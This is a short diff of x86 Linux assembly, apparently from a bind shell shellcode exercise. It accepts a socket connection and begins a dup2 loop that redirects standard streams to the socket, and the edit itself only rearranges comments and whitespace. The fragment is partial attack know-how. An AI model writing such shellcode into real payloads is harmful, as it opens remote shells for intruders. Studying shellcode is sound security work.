@@ -302,11 +302,11 @@ _start:
     cdq                    ; Clearing EDX for 3rd argument - 0
     xor esi, esi           ; Clearing ESI for 4th argument - 0
     int 0x80               ; Execute accept4 syscall
-
+    
     ; Storing the return value connection socket fd in EAX to EBX for later usage
 	mov ebx, eax
-
-	mov cl, 0x3            ; Initializing a counter variable = 3 for loop
+    ; Initializing a counter variable = 3 for loop
+	mov cl, 0x3    
 
 	; dup2() Syscall in loop
 	loop_dup2:
